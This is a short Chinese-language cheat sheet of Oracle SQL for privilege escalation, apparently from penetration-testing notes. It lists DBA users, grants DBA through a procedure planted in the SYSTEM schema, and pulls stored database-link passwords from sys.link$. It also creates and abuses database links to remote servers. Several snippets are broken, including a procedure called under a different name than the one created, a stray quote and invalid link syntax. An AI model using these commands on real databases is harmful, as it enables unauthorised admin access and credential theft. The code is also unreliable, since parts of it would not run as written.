## 提权

### 转储所有DBA用户名
```sql
SELECT username FROM user_role_privs WHERE granted_role='DBA';
```

### 使用户成为DBA
```sql
GRANT DBA to USER
```

### 创建程序
```sql
CREATE OR REPLACE PROCEDURE "SYSTEM".snowwolf (id IN VARCHAR2)
AS
PRAGMA autonomous_transaction;
EXECUTE IMMEDIATE 'grant dba to scott';
COMMIT;
END;

BEGIN
SYSTEM.netspi1('snowwolf');
END;
```

### 查找数据库链接
```sql
SELECT * FROM DBA_DB_LINKS
SELECT * FROM ALL_DB_LINKS
SELECT * FROM USER_DB_LINKS
```

### 查找数据库链接
```sql
SELECT * FROM test@ghost -- minimum for preconfigured
SELECT * FROM snowwolf@ghostwolflab.com -- standard usage for selecting table from schema on remote server
SELECT * FROM snowwolf@ghostwolflab.com@hq_1 -- standard usage for selecting table from schema on remote server instance
SELECT db_link,password FROM user_db_links WHERE db_link LIKE 'TEST%''
SELECT name,password FROM sys.link$ WHERE name LIKE 'TEST%';
SELECT name,passwordx FROM sys.link$ WHERE name LIKE 'TEST%';
```

### 在数据库链接上执行存储过程
```sql
EXEC mySchema.myPackage.myProcedure@myRemoteDB( 'someParameter' );
SELECT dbms_xmlquery.getxml('select * from emp') FROM snowwolf@ghostwolflab.com
```

### 创建数据库链接
```sql
CREATE SHARED PUBLIC DATABASE LINK supply.zh.ghostwolflab.com; -- connected user setup
CREATE SHARED PUBLIC DATABASE LINK supply.zh.ghostwolflab.com CONNECT TO harold AS tiger; -- standard defined user/pass
CREATE SHARED PUBLIC DATABASE LINK hq.ghostwolflab.com.com@hq_1 USING 'string_to_hq_1'; -- instance specific
CREATE SHARED PUBLIC DATABASE LINK link_2 CONNECT TO jane IDENTIFIED BY doe USING 'zh_supply'; -- defined user/pass
```

### 移除链接
```sql
DROP DATABASE LINK ghost;
```
